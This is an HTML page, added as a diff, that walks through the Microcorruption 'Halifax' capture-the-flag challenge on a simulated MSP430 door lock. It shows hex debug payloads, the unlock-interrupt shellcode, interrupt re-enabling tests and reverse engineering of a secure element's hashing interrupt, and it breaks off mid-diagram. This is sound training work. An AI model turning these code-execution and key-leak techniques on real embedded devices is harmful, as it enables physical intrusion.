@@ -1,0 +1,2852 @@
+<!DOCTYPE html>
+<html><head>
+    <title>Halifax — James Every</title>
+    <link rel="shortcut icon" type="image/jpg" href="./images/favicon/glider.ico"/>
+
+    <meta charset="utf-8">
+    <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <meta name="description"
+        content="The writings and projects of James Every." />
+    <meta property="og:title" content="About" />
+    <meta property="og:url" content="https://jamesevery.com" />
+    <meta property="og:description"
+        content="The writings and projects of James Every." />
+    <meta property="og:type" content="website" />
+
+    <link rel="stylesheet" href="./css/style.min.css" />
+    <style type="text/css">
+
+.language-ascii-art {
+ display: inline-block; 
+ font-family: "Lucida Console", Monaco, monospace;
+ letter-spacing: -0.2em;
+ line-height: 0.8em;
+ text-shadow: 0 0 5px rgba(100,100,100,0.5);
+}
+
+.language-ascii-noshadows {
+ display: inline-block; 
+ letter-spacing: 0em;
+ line-height: 1.16em;
+}
+    </style>    
+</head>
+
+<body>
+<div>
+
+<body id="top">
+  <header>
+    <h1>
+	    Meteorological Opposite of Hell: Secure Element Black Box Firmware Analysis
+    </h1>
+	    </h2>
+    <p class="author">
+      James Every <br />
+      November 2023
+    </p>
+  </header>
+
+    <div class="abstract">
+      <h2>Abstract</h2>
+
+     <p>
+      This page is a walkthrough for <a href="https://microcorruption.com/debugger/Halifax">Halifax</a>, the sixth and final in a <a href="https://research.nccgroup.com/2022/10/31/check-out-our-new-microcorruption-challenges/">recent</a> <a href="https://microcorruption.com/map">series</a> of reverse engineering challenges from the Embedded Systems division at NCC Group.
+      </p>
+    </div>
+
+    <h2>
+	    Overview
+    </h2>
+    <b>First Working Exploit:</b> 1328 UTC, October 31st, 2022
+    <br>
+    <b>Blockchain Timestamp:</b> 1831 UTC, October 31st, 2022
+    <br>
+    <b>Pastebin Timestamp:</b>
+    <a href="https://pastebin.com/hKCp5UgH">pastebin.com/hKCp5UgH</a>
+    <br>
+    <b><a href="https://opentimestamps.org">Cryptographic Proof of Existence</a>:</b> <a href="./solutions/halifax/solution.txt">solution.txt</a> <a href="./solutions/halifax/solution.txt.ots">solution.txt.ots</a>
+    <br>
+    <b>Solve Count At Time Of Writing:</b> 45
+    <br>
+    <b>Solves Per Month:</b> 3.52
+    <br>
+    <b>Reading Time:</b> 45 minutes
+
+
+    <p>The unlock interrupt is now disabled via an undocumented mechanism. While the debug payload is unsigned and achieving arbitrary code execution is trivial, the portable shellcode—which works on previous firmware versions—no longer appears to retract the deadbolt.</p>
+
+    <p><b>Author's Note:</b></p>
+
+    <p>At the time of writing, under four dozen people on Earth have written working exploits for the Halifax firmware. The one described herein was the first—completed the same day the challenges were announced.<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">
+	<b>Challenges Deployed:</b>
+    <br>
+    0800 UTC, October 28th, 2022.
+    <br>
+    <b>First Working Exploit:</b>
+    <br>
+    1328 UTC, October 31st, 2022.
+    <br>
+    <b>First Wayback Machine Snapshot:</b>
+    <br>
+    <a href="https://web.archive.org/web/20221031175156/https://research.nccgroup.com/2022/10/31/check-out-our-new-microcorruption-challenges/">1751 UTC, October 31st, 2022</a>
+    <br>
+    <b>Announcement Post:</b>
+    <br>
+    <a href="https://research.nccgroup.com/2022/10/31/check-out-our-new-microcorruption-challenges/">October 31st, 2022</a>
+</span>
+</p>
+
+<h3>Sample Payload</h3>
+<p>The debug payload is relatively short, and the load address is read big-endian. The example payload is below.</p>
+
+<pre><code class="asm">8000023041
+</code></pre>
+
+<h3>Sample Output</h3>
+<p>Running the firmware with the example debug payload will produce the following output at the console:</p>
+
+<pre><code class="asm">Welcome to the test program loader.
+Enabling hardened mode
+Verifying 0x7f interrupt disabled
+0x7f interrupt disabled, key stored in internal SRAM
+unlock by providing the 16 byte key to 0x41 interrupt
+Internal SRAM Hash:
+0865DECED9DEB1245501768025853EA0FE5FAF4D2B7133E2D2F1B8D52ED0588D
+Please enter debug payload.
+Executing debug payload
+Please enter debug payload.
+</code></pre>
+
+<p>The debug payload is loaded to address <code>0x8000</code> and successfully executed.</p>
+
+<br>
+      <figure>
+        <img src="./images/halifax-execution-reaches-8000.png"
+          loading="lazy" alt="Execution reaches address 8000." />
+      </figure>
+
+<h2>High-Level Analysis</h2>
+
+<h3>Manual</h3>
+<p>The output for the "manual" debugger command contains the following description of the new behavior:</p>
+
+<blockquote>
+Any payload is allowed,  because the unlock key must be passed to the new interrupt  with  code 0x41, and this key is only stored in secure memory.
+</blockquote>
+
+
+<h3>Payload Format</h3>
+<p>The payload format is the same as in Vancouver.</p>
+<br>
+
+      <table>
+        <caption>Parsing Format</caption>
+        <thead>
+          <tr>
+            <th>Load Address</th>
+            <th>Size (Bytes)</th>
+            <th>Executable code</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+		  <td><code>8000</code></td>
+		  <td><code>02</code></td>
+		  <td><code>3041 (RET)</code></td>
+          </tr>
+        </tbody>
+      </table>
+
+<h3>Flow Control Graph</h3>
+
+      <figure>
+         <img src="./images/halifax-main-flow-control.png"
+          loading="lazy" alt="Main function flow control graph." />
+      </figure>
+
+      <h3>Signature Verification</h3>
+
+      <p>The absence of apparent calls to <code>ed25519_verify</code></code><label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">
+	Signature verification on St. Johns, Cold Lake, and Churchill used this function.
+</span>
+
+suggests that the debug payload lacks signature verification. This vulnerability can be confirmed by attempting to submit any arbitrary payload. The crafted payload below includes a size field incremented by two and a second return instruction appended to the end of the executable section.</p>
+
+      <pre><code>800004<mark>30413041</mark></code></pre>
+
+      <p>Breaking at address <code>0x8000</code> and continuing execution verifies that this payload is successfully loaded into memory and executed:</p>
+
+<br>
+      <figure>
+        <img src="./images/halifax-execution-reaches-8000-2.png"
+          loading="lazy" alt="Execution reaches address 8000." />
+      </figure>
+
+      <h3>Inconsistent Internal SRAM Hash</h3>
+      <p>It is worth noting that the "Internal SRAM Hash" seems to change between runs, which is verifiable by using the reset command and continuing execution from the beginning. Below are two different samples:</p>
+
+<pre><code>Welcome to the test program loader.
+Enabling hardened mode
+Verifying 0x7f interrupt disabled
+0x7f interrupt disabled, key stored in internal SRAM
+unlock by providing the 16 byte key to 0x41 interrupt
+Internal SRAM Hash:
+<mark>B786D20726FB0E6E8EB8ECCD92EFFBEDA6875755722ABE2B15A8D1B4541559CF</mark>
+Please enter debug payload.
+</code></pre>
+
+<pre><code>Welcome to the test program loader.
+Enabling hardened mode
+Verifying 0x7f interrupt disabled
+0x7f interrupt disabled, key stored in internal SRAM
+unlock by providing the 16 byte key to 0x41 interrupt
+Internal SRAM Hash:
+<mark>74972D7E94276A0BDE1C3046EF81EFB5B079BACDD171CA6B9C1D6B29CCDBFB39</mark>
+Please enter debug payload.
+</code></pre>
+
+<h3>Sanity Check</h3>
+<p>The next step is to verify that the unlock interrupt is disabled, which is accomplished by reusing the portable shellcode from Vancouver.</p>
+
+<pre><code>800008324000ffb0121000
+</pre></code>
+
+      <table>
+        <caption>Payload Structure</caption>
+        <thead>
+          <tr>
+            <th>Load Address</th>
+            <th>Size (Bytes)</th>
+            <th>Executable code</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+		  <td><code>8000</code></td>
+		  <td><code>08</code></td>
+		  <td><code>324000ffb0121000</code></td>
+          </tr>
+        </tbody>
+      </table>
+
+<pre><code>3240 00ff      mov       #0xff00, sr
+b012 1000      call      #0x10
+</code></pre>
+
+      <p>Breaking at address <code>8000</code> and single-stepping verifies that the call to address <code>0x10</code> happens as usual. However, it returns with no discernible effect, which suggests that the unlock interrupt is disabled.</p>
+
+
+<h2>Reverse Engineering Methodology</h2>
+<h3>Similar Systems</h3>
+
+<p>Anyone familiar with the original challenges set will remember that some involved bypassing hardware security modules (HSMs). Detailed writeups for the exploits used to bypass these HSMs <a href="https://jaimelightfoot.com/blog/microcorruption-embedded-security-ctf-hanoi/">already</a> <a href="https://jaimelightfoot.com/blog/microcorruption-embedded-security-ctf-whitehorse/">exist</a> elsewhere, but it is worth briefly summarizing<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">
+Emphasis added unless otherwise noted. 
+</span>
+
+how they work because this system may be similar.</p>
+
+<h5>HSM Model 1</h5>
+<blockquote>
+	3.2 HSM Model 1<br>
+	The Model 1 of the hardware security module contains a simple interface which allows the MCU to test if an entered password is valid. By default, the interrupt <mark>0x7D</mark> will pass a given password to the HSM, and will set a byte in memory if the password entered matches the stored password.
+<br>
+<cite>— <a href="https://microcorruption.com/public/manual.pdf">Microcorruption Manual</a></cite>
+</blockquote>
+
+The <a href="https://microcorruption.com/debugger/Hanoi">Hanoi</a> firmware version employs the HSM Model 1.
+
+
+<blockquote>
+	The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the <em>HSM will return if the password  is correct by setting  a flag in memory</em>.
+
+This [hardware version contains] two available  ports: the LockIT Pro Deadbolt should be  connected to  port  1, and the  LockIT  Pro  HSM-1 should be connected to port 2.
+    <br>
+    <cite>— Hanoi Level Manual</cite>
+    </blockquote>
+
+    <p>This external device prevents attackers from extracting passwords by dumping the program strings. It takes a pointer to the user-supplied password and returns a boolean indicating whether the supplied credential is correct.</p>
+
+    <p>There is code on the MCU that is responsible for checking this boolean and triggering the unlock interrupt if the HSM sets it to true. Exploitation involves a logical buffer overflow to overwrite it and make the conditional check pass.</p>
+
+
+<h5>HSM Model 2</h5>
+<blockquote>
+	3.3 HSM Model 2
+	<br>
+	The Model 2 of the hardware security module is a more advanced HSM, with the ability to directly trigger the unlock functionality in the lock. The MCU passes the lock a password, and the HSM will trigger the unlock if the password is valid. By default, the interrupt <mark>0x7E</mark> will pass a given password to the HSM, and the lock will be opened if the password entered matches the stored password.
+<br>
+<cite>— <a href="https://microcorruption.com/public/manual.pdf">Microcorruption Manual</a></cite>
+</blockquote>
+
+<p>The <a href="https://microcorruption.com/debugger/Whitehorse">Whitehorse</a> firmware version employs the HSM Model 2.</p>
+
+<blockquote>
+	The LockIT Pro  can send the LockIT Pro HSM-2  a password, and the HSM will  <em>directly</em> send the correct unlock message to the LockIT Pro Deadbolt  if the password is correct, <em>otherwise no action is taken</em>.
+	This [hardware version contains] two available  ports: the LockIT Pro Deadbolt should be  connected to  port  1,  and the  LockIT  Pro  HSM-2 should  be connected to port 2.
+	[...] We have <em>removed the function to unlock the door</em> from the LockIT Pro firmware.
+    <br>
+    <cite>— Whitehorse Level Manual</cite>
+    </blockquote>
+
+    <p>This description is misleading because it implies that the unlock interrupt is blocked at a hardware level (i.e., only the HSM has deadbolt unlock capabilities), potentially leading an attacker into believing they have to perform black-box analysis against the HSM. In reality, it is possible to exploit a stack overflow and inject malicious code to trigger the unlock interrupt from the MCU (using essentially the same shellcode as in Vancouver).</p>
+
+    <h3>The Canadian Connection</h3>
+    <p>The disassembly and the status messages indicate that interfacing with external hardware likely requires interrupts <code>0x40</code> and <code>0x41</code>—much like <code>0x7D</code> and <code>0x7E</code> from the original challenge set.</p>
+
+    <p>Halifax is effectively a next-gen version of Whitehorse. Whitehorse is insecure because it does not block the unlock interrupt at a hardware level, whereas Halifax might. A successful attack against the latter will likely involve a more advanced variation on the process used to exploit the former.</p>
+
+<h2>Hardware Architecture</h2>
+
+<h3>Vancouver</h3>
+<p>The original hardware design, used in Vancouver and most of the previous versions, resembles the following diagram:</p>
+<br>
+      <figure>
+        <img src="./images/vancouver-hardware.png"
+          loading="lazy" alt="Vancouver hardware architecture." />
+      </figure>
+
+      <p>The deadbolt is assumed to be an electromechanical device that performs some physical action when supplied with voltage. Control over this action is equivalent to owning the system. Successfully triggering the unlock interrupt from software most likely causes the processor to pull a GPIO pin high, thus supplying voltage to the deadbolt and causing it to retract.</p>
+
+<h3>Hanoi</h3>
+<p>Hanoi was the first device version to employ an HSM, relying on it as a secure credential store. Based on the level manual, the hardware architecture resembles the following diagram.</p>
+<br>
+      <figure>
+        <img src="./images/hanoi-hardware.png"
+          loading="lazy" alt="Vancouver hardware architecture." />
+      </figure>
+
+      <p>Communications between the MCU and HSM occur over a serial line (or similar). This version of the HSM has no way to trigger the unlock directly, relying instead on the MCU to implement this logic. The hardware security architecture of this system is flawed because an attacker with arbitrary code execution on the MCU can ignore the HSM.</p>
+
+      <h3>Whitehorse</h3>
+      <p>In addition to serving as a secure credential store, the Model 2 HSM can trigger the unlock directly—although this does not prevent the MCU from doing so. Based on the level manual, the hardware architecture resembles the following diagram.</p>
+
+      <br>
+      <figure>
+        <img src="./images/whitehorse-hardware.png"
+          loading="lazy" alt="Whitehorse hardware architecture." />
+      </figure>
+
+      <p>The flaw in the above design is that there is no redundancy. An attacker only needs to exploit one processor to supply voltage to the deadbolt and can safely ignore the other chip.</p>
+
+      <p>This design would require a simple modification to fix: disconnect the MCU from the deadbolt. This countermeasure requires an attacker to compromise the HSM.</p>
+
+      <h3>Halifax</h3>
+      <p>Even with the MCU disconnected from the deadbolt, the HSM is still a single point of failure. A better architecture might require consensus among multiple cores before an unlock can be triggered, requiring attackers to compromise the MCU and the HSM in sequence. Preventing an attacker who compromises a single processor from controlling the system could be accomplished with a hardware architecture resembling the following diagram.</p>
+
+<br>
+
+      <figure>
+        <img src="./images/halifax-hardware.png"
+          loading="lazy" alt="Halifax hardware architecture." />
+      </figure>
+
+
+      <p>The transistor is assumed to be an <code>AND</code> logic gate, meaning that voltage physically cannot be supplied to the deadbolt unless the MCU and the HSM pull their bottom pins high. The code on the MCU communicates with the HSM over serial (or similar), authenticates in some capacity, and the HSM pulls its pin high if the authentication is successful. Even if an attacker gains arbitrary code execution on the MCU, they must still compromise the HSM to pull the other pin high.</p>
+
+      <h2>Attack Surface</h2>
+      <p>There are two different approaches for developing a working attack against this system:</p>
+      <ol>
+	      <li>Assume there is a transistor. The unlock interrupt is disabled at a physics level, requiring exploitation of the HSM and manipulating it into pulling its pin high.</li>
+	      <li>Assume there is no transistor. The unlock interrupt is disabled on the MCU itself, which implies that it might be possible to write shellcode that re-enables it before making the interrupt call.</li>
+      </ol>
+
+      <p>The latter mechanism effectively relies on security through obscurity to prevent an attacker from re-enabling the interrupt, which makes it the lower-hanging fruit and the logical next target for analysis. The former would effectively require remote black-box analysis of an undocumented security processor.</p>
+
+      <h2>Re-Enabling Interrupts From Software</h2>
+
+      <p>Assuming it might be possible to write shellcode that re-enables the unlock interrupt before triggering it, the first approach is to review the documentation for this system and its underlying hardware. The <a href="https://microcorruption.com/public/manual.pdf">manual PDF</a> supplied with the system does not mention the new functionality, so it is impossible to tell what purpose interrupts <code>0x40</code> and <code>0x41</code> serve.</p>
+
+      <h3>The EINT And DINT Instructions</h3>
+      <p>Initial internet searches turn up a salient artifact: one of the <a href="https://www.ti.com/sc/docs/products/micro/msp430/userguid/as_5.pdf">manuals</a> for the instruction set architecture contains a reference to instructions that are supposed to disable and enable interrupts.</p>
+
+      <br>
+      <figure>
+        <img src="./images/msp-430-manual-eint.png"
+          loading="lazy" alt="MSP430 manual (EINT/DINT instructions)." />
+      </figure>
+
+      <br>
+
+      <figure>
+        <img src="./images/msp-430-manual-legend.png"
+          loading="lazy" alt="MSP430 manual legend." />
+      </figure>
+
+      <p>Attempting to assemble either of these instructions using the provided assembler results in an error:</p>
+
+      <pre><code>Error assembling:
+TypeError: a.split(...)[1] is undefined
+</code></pre>
+
+<h3>Emulated Instructions</h3>
+<p>The manual has an asterisk next to these instructions, which the legend indicates are "emulated instructions." Another architecture <a href="https://www.ti.com/sc/docs/products/micro/msp429/userguid/ag_b.pdf">manual</a> contains a more detailed explanation of this functionality:</p>
+
+<blockquote>
+There are core instructions that are implemented into hardware, and emulated instructions that use the hardware construction and emulate instructions with high efficiency. The emulated instructions use core instructions with the additional built-in constant generators CG1 and CG2.
+</blockquote>
+
+<p>The following description follows slightly later:</p>
+
+<blockquote>
+The assembler accepts the mnemonic of the emulated instruction, and inserts the opcode of the suitable core instruction.
+</blockquote>
+
+<p>The following table (taken from the same manual) shows the relationship between emulated instructions and core instructions:</p>
+
+<br>
+
+      <figure>
+        <img src="./images/msp-430-emulated-to-core-table.png"
+          loading="lazy" alt="Short form of emulated instructions." />
+      </figure>
+
+      <p>The third and fourth lines from the bottom indicate that the emulated <code>DINT</code> and <code>EINT</code> instructions are replaceable with their core equivalents.</p>
+
+      <br>
+
+      <table>
+        <caption>Emulated instruction equivalents for disabling/enabling interrupts</caption>
+        <thead>
+          <tr>
+            <th>Emulated Instruction</th>
+            <th>Core Instruction</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+		  <td><code>DINT</code></td>
+		  <td><code>BIC #8,SR</code></td>
+          </tr>
+          <tr>
+		  <td><code>EINT</code></td>
+		  <td><code>BIS #8,SR</code></td>
+          </tr>
+        </tbody>
+      </table>
+
+      <p>The naive approach is attempting to globally disable and re-enable all interrupts in the hope of re-enabling the blocked one. A simple test of this functionality would entail calling DINT followed by EINT, but there is one caveat to this approach: according to this <a href="https://e2e.ti.com/support/microcontrollers/msp-low-power-microcontrollers-group/msp430/f/msp-low-power-microcontroller-forum/397100/the-notes-about-dint-and-eint-in-user-s-guide">forum post</a>, a few NOP instructions must follow DINT because it takes multiple cycles to take effect.</p>
+
+
+<h3>Working Around Broken Assemblers</h3>
+
+      <p>The built-in assembler does not work consistently, so the assembler from the <a href="https://github.com/Swiftloke/MSProbe">MSProbe project</a> is used to generate the executable code for the section of the payload containing the <code>DINT</code> and <code>EINT</code> instructions. This assembler correctly interprets the emulated instructions.</p>
+
+      <p>The test payload is as follows:</p>
+
+<pre><code>80001c32c2034303430343034332d20343034303430343324000ffb0121000
+</pre></code>
+
+      <table>
+        <caption>Payload Structure</caption>
+        <thead>
+          <tr>
+            <th>Load Address</th>
+            <th>Size (Bytes)</th>
+            <th>Executable code</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+		  <td><code>8000</code></td>
+		  <td><code>1c</code></td>
+		  <td><code>32c2 0343 0343 0343 0343 32d2 0343 0343 0343 0343 3240 00ff b012 1000</code></td>
+          </tr>
+        </tbody>
+      </table>
+
+<p>The executable code in the example debug payload disassembles to the following:</p>
+
+
+<pre><code class="asm"><xmp>32c2           bic	#0x8, sr
+0343           clr	4
+0343           clr	4
+0343           clr	4
+0343           clr	4
+32d2           bis	#0x8, sr
+0343           clr	4
+0343           clr	4
+0343           clr	4
+0343           clr	4
+3240 00ff      mov	#0xff00, sr
+b012 1000      call	#0x10
+</xmp></code></pre>
+
+<p>Testing the above payload on Vancouver confirms that the unlock is triggered, but this does not work on Halifax. The call to <code>0x10</code> once again returns without visible effect. With the possibility of re-enabling the interrupt from software eliminated, the only remaining option is performing <em>black-box analysis</em> against the secure processor.</p>
+
+<h2>Black Box Analysis</h2>
+<p>For the sake of argument, assume that the logical <code>AND</code> transistor is present moving forward. Before beginning any deep analysis, the first step is understanding the secure processor API, which requires a more detailed review of the disassembly and flow control for the <code>main</code> function.</p>
+
+<h2>Static Analysis</h2>
+<hr>
+<h5>Flow Control Graph</h5>
+
+      <figure>
+         <img src="./images/halifax-main-flow-control.png"
+          loading="lazy" alt="Main function flow control graph." />
+      </figure>
+
+      <p>Observing the string printed by each conditional block allows the deduction of its purpose.</p>
+
+<h3 id="tables">Status Messages</h3>
+      <table>
+        <caption>Defined Strings</caption>
+        <thead>
+          <tr>
+            <th>String Address</th>
+            <th>String</th>
+            <th>Address of Conditional Block Containing Referencing Code</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+		  <td>4634</td>
+		  <td>"Welcome to the test program loader."</td>
+		  <td>443e</td>
+	  </td>
+
+          <tr>
+		  <td>4658</td>
+		  <td>"Enabling hardened mode"</td>
+		  <td>443e</td>
+	  </td>
+		  
+          <tr>
+		  <td>466f</td>
+		  <td>"Verifying 0x7f interrupt disabled"</td>
+		  <td>443e</td>
+	  </td>
+		  
+          <tr>
+		  <td>4691</td>
+		  <td>"0x7f interrupt disabled, key stored in internal SRAM"</td>
+		  <td>443e</td>
+	  </td>
+		  
+          <tr>
+		  <td>46c6</td>
+		  <td>"unlock by providing the 16 byte key to 0x41 interrupt"</td>
+		  <td>443e</td>
+	  </td>
+		  
+          <tr>
+		  <td>46fc</td>
+		  <td>"Internal SRAM Hash:"</td>
+		  <td>443e</td>
+	  </td>
+		  
+          <tr>
+		  <td>4710</td>
+		  <td>"0123456789ABCDEF"</td>
+		  <td>44ac</td>
+	  </td>
+		  
+          <tr>
+		  <td>4722</td>
+		  <td>"Please enter debug payload.</td>
+		  <td>44ee</td>
+	  </td>
+		  
+          <tr>
+		  <td>473e</td>
+		  <td>"Invalid payload length"</td>
+		  <td>4524</td>
+	  </td>
+		  
+          <tr>
+		  <td>4755</td>
+		  <td>"Executing debug payload"</td>
+		  <td>452e</td>
+	  </td>
+        </tbody>
+      </table>
+
+      <p>The 0x40 interrupt seems to be responsible for enabling "hardened mode." This interrupt effectively disables the unlock interrupt, and the standard portable shellcode has no discernible effect when executed after this call.</p>
+
+      <pre><code>444a:  mov	#0x4658 "Enabling hardened mode", r15
+444e:  call	#0x4586 &lt;puts&gt;
+4452:  push	#0x0
+4454:  push	#0x0
+4456:  push	<mark>#0x40</mark>
+445a:  call	#0x4550 &lt;INT&gt;
+</code></pre>
+
+<p>The firmware behavior confirms this, as it attempts to call the unlock interrupt to ensure it is disabled.</p>
+
+      <pre><code>4462:  mov	#0x466f "Verifying 0x7f interrupt disabled", r15
+4466:  call	#0x4586 &lt;puts&gt;
+446a:  push	#0x0
+446c:  push	#0x0
+446e:  push	<mark>#0x7f</mark>
+4472:  call	#0x4550 &lt;INT&gt;
+</code></pre>
+
+<p>This check is followed in turn by two <code>puts</code> calls to print the following status messages:</p>
+
+<pre><code>0x7f interrupt disabled, key stored in internal SRAM
+unlock by providing the 16 byte key to 0x41 interrupt
+</code></pre>
+
+
+      <h3>Implementation Conjecture</h3>
+<p>Based on the above analysis, a few tentative theories emerge:</p>
+<ul>
+	<li>The 0x40 interrupt causes the secure processor to pull its GPIO pin low, causing the logical <code>AND</code> gate to turn off and physically preventing unlock interrupts triggered from the MCU from retracting the deadbolt.</li>
+	<li>Turning the secure processor's GPIO pin back on requires sending a 16-byte key over the serial line.</li>
+	<li>The 16-byte key resides in "SRAM," likely standing for "secure RAM" or "static RAM" and presumably referring to the internal memory of the secure processor.</li>
+	<li>The key must be passed to the secure processor through interrupt <code>0x41</code>, using an undocumented calling convention.</li>
+</ul>
+
+<p>The fact that the SRAM hash changes between runs suggests that the content of SRAM also changes. It is impossible to rule out random key generation or mutation during the initial <code>0x40</code> interrupt call.</p>
+
+<h2>Hardware Security Background</h2>
+<p>While it has been convenient to refer to the external hardware as an "HSM" or "secure processor" up to this point, it is worth noting that it could be one of multiple similar things. These hardware security devices fall into four broad categories:</p>
+
+<ol>
+	<li>Hardware Security Modules (HSMs)</li>
+	<li>Trusted Platform Modules (TPMs)</li>
+	<li>Secure Enclaves or Trusted Execution Environments (TEEs)</li>
+	<li>Secure Elements (SEs)</li>
+</ol>
+
+<p>WolfSSL has a <a href="https://www.wolfssl.com/difference-hsm-tpm-secure-enclave-secure-element-hardware-root-trust/">page</a> summarizing the differences.</p>
+
+
+
+
+<p>It is possible to execute custom code inside TEEs, but this is not true of the other three categories—which usually only run code written by their respective vendors. The lack of boutique code theoretically means secure elements, HSMs, and TPMs have undergone more intense security testing,<label for="sn-1" class="sidenote-toggle sidenote-number"></label>
+
+<input type="checkbox" id="sn-1" class="sidenote-toggle" />
+<span class="sidenote">Of course, this claim is speculative, as it is impossible to determine how much review or testing any proprietary codebase has undergone.</span>
+
+ and fixing vulnerabilities is the vendor's responsibility.</p>
+
+<p>The main difference between these device classes (from a software exploitation standpoint) is the degree to which they are Turing complete. Some of these devices may implement operations using varying amounts of analog logic, which means that exploitation in the traditional sense may not be possible because there is no software on the device to exploit.</p>
+
+
+<h3>Theoretical Attacks</h3>
+<p>There are a few possible attacks to consider:</p>
+<ol>
+	<li>Arbitrary code execution on the "secure processor."</li>
+	<li>Authentication bypass due to a logic flaw.</li>
+	<li>Leaking the key from SRAM.</li>
+</ol>
+
+<p>Arbitrary code execution may or may not be possible depending on whether the backing hardware device is Turing complete. Fuzzing would also be difficult without some understanding of the communication protocol or calling convention. Without having an example of how to communicate with the device normally, there are similar problems with attempting to bypass authentication.</p> 
+
+<p>Assuming the device is Turing complete, the compiled code for the implementation may reside in SRAM. Even if it is impossible to extract the key, acquiring an image of the running firmware for further analysis might still be possible. One way or another, an information leak is likely required.</p>
+
+<h2>Hunting For Information Leaks</h2>
+<h3>SRAM Hash Calculation</h3>
+<p>The obvious target for a memory leak is functionality that already reads data from SRAM. The SRAM hash calculation is a likely candidate.</p>
+
+<p>The <code>sha256_internal</code> function is a wrapper for an 0x41 interrupt call, which implies that the interrupt used to pass the unlock key is the same one used to compute the SRAM hash.</p>
+
+<pre><code>45b6 &lt;sha256_internal&gt;
+45b6:  0d12           push	r13
+45b8:  0e12           push	r14
+45ba:  0f12           push	r15
+45bc:  3012 4100      push	<mark>#0x41</mark>
+45c0:  b012 5045      call	#0x4550 &lt;INT&gt;
+45c4:  3152           add	#0x8, sp
+45c6:  3041           ret
+</code></pre>
+
+<p>The setup for the function call is as follows.</p>
+
+<br>
+<hr>
+      <figure>
+         <img src="./images/halifax-sha256-internal-parameters.png"
+          loading="lazy" alt="Halifax sha256_internal parameters." />
+      </figure>
+<hr>
+
+<p>The value in <code>R13</code> is a pointer to the stack—likely the location where the function returns the computed checksum. Observing stack memory before and after the call confirms this theory.</p>
+
+<pre><code class='language-ascii-noshadows'>┌───────────────────────────────────────────────┐
+│                     STACK                     │
+├───────┬───────────────────────────────────────┤
+│ADDRESS│                 DATA                  │
+├───────┼───────────────────────────────────────┤
+│  43d0 │6445 0100 8245 0000 0a00 a045 0000 9e44│
+├───────┼───────────────────────────────────────┤  ┌───┬───────────────┐
+│  43e0 │<mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>│◄─┤R13│CHECKSUM BUFFER│
+├───────┼───────────────────────────────────────┤  └───┴───────────────┘
+│  43f0 │<mark>0000 0000 0000 0000 0000 0000 0000 0000</mark>│
+└───────┴───────────────────┬───────────────────┘
+                            │
+                            ▼ CALL
+                    ┌───────────────┐
+                    │sha256_internal│
+                    └───────┬───────┘
+                            │
+                            ▼ RETURN
+┌───────┬───────────────────────────────────────┐
+│  43d0 │6445 0000 c445 4100 0000 0010 e043 aa44│
+├───────┼───────────────────────────────────────┤  ┌───┬───────────────┐
+│  43e0 │<mark>c2a1 46c0 e5dc c4db e06c 413d a787 2f06</mark>│◄─┤R13│CHECKSUM BUFFER│
+├───────┼───────────────────────────────────────┤  └───┴───────────────┘
+│  43f0 │<mark>ac82 ff94 28f2 d00d 4326 1514 6748 1df2</mark>│
+└───────┴───────────────────────────────────────┘
+</code></pre>
+
+<p>The 32-byte value beginning at address <code>43e0</code> is the internal SRAM hash, confirmed by the status message printed soon afterward:</p>
+
+<pre><code>Internal SRAM Hash:
+<mark>C2A146C0E5DCC4DBE06C413DA7872F06AC82FF9428F2D00D4326151467481DF2</mark></code></pre>
+
+<h3>Calling Convention</h3>
+
+<p>The purpose of the values in <code>R14</code> and <code>R15</code> is not immediately apparent.</p> 
+
+<br>
+<hr>
+      <figure>
+         <img src="./images/halifax-sha256-internal-parameters-2.png"
+          loading="lazy" alt="Halifax sha256_internal parameters." />
+      </figure>
+<hr>
+
+<pre><code>pc  45c0  sp 43d6  sr 0000  cg 0000
+r04 0000 r05 5a08 r06 0000 r07 0000 
+r08 0000 r09 0000 r10 0000 r11 0000 
+r12 4400 r13 43e0 <mark>r14 1000 r15 0000</mark> 
+</code></pre>
+<p>Breaking at address <code>0x44a6</code> and manually setting <code>R15</code> to 0x100 before the call to <code>sha256_internal</code> results in the following error.</p>
+
+<br>
+      <figure>
+         <img src="./images/halifax-exceeded-sram-length.png"
+          loading="lazy" alt="Halifax sha256_internal parameters." />
+      </figure>
+
+<p>This string is not defined anywhere in the program memory and prints to the debugger console rather than the I/O console.</p>
+
+<h5>Further permutations:</h5>
+<ul>
+	<li>Setting <code>R15</code> to 0x1 produces the same error.</li>
+	<li>Changing <code>R14</code> to 0x800 and <code>R15</code> to 0x1 seems to result in normal behavior.</li>
+</ul>
+
+<h3>Address Range Hashing</h3>
+<p>If the <code>sha256_internal</code> function is computing a checksum for a fixed-length block of memory at a known offset, it should logically need only one parameter (the address of the stack buffer where interrupt 0x41 writes the returned checksum). The fact that there are two more implies that the interrupt hashes a specific section of SRAM. Such functionality would require two more parameters, i.e., a start and end address.</p>
+
+
+<pre><code class='language-ascii-noshadows'>               ┌───┬────┐                    ┌───┬────┐
+               │R15│0002│                    │R14│000e│
+               └───┼────┘                    └───┼────┘
+                   │                             │
+                   ▼                             ▼
+┌────┬────────┬────┬────┬────┬────┬────┬────┬────┬────┬────┐
+│    │CONTENTS│AAAA│<mark>BBBB│CCCC│DDDD│EEEE│FFFF│1111</mark>│2222│3333│
+│SRAM├────────┼────┼────┼────┼────┼────┼────┼────┼────┼────┤
+│    │ADDRESS │0000│0002│0004│0006│0008│000a│000c│000e│0010│
+└────┴────────┴────┴────┴────┴────┴────┴────┴────┴────┴────┘
+</code></pre>
+
+
+<p>The problem with this theory is that it should be impossible to "exceed SRAM length" by setting the lower of the two values slightly higher. That error implies that one is the start offset and the other is the length.</p>
+
+<pre><code class='language-ascii-noshadows'>                                             ┌───┬────┐
+                                             │R14│000c│
+                                             └───┴────┘
+
+               ┌───┬────┐                ┌───────┬────┐
